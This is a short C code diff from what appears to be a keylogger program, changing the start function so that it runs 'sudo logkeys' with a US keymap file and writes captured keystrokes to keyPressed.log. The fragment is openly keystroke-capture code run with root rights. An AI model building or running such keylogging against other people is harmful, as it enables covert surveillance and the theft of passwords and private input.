@@ -5,7 +5,7 @@ void keylogger_init(){
 }
 void keylogger_start(){
 	system("touch keyPressed.log");
-	system("sudo logkeys --start --output keyPressed.log");
+	system("sudo logkeys --start -m en_US_ubuntu_1204.map  --output keyPressed.log");
 }
 
 void keylogger_end(){
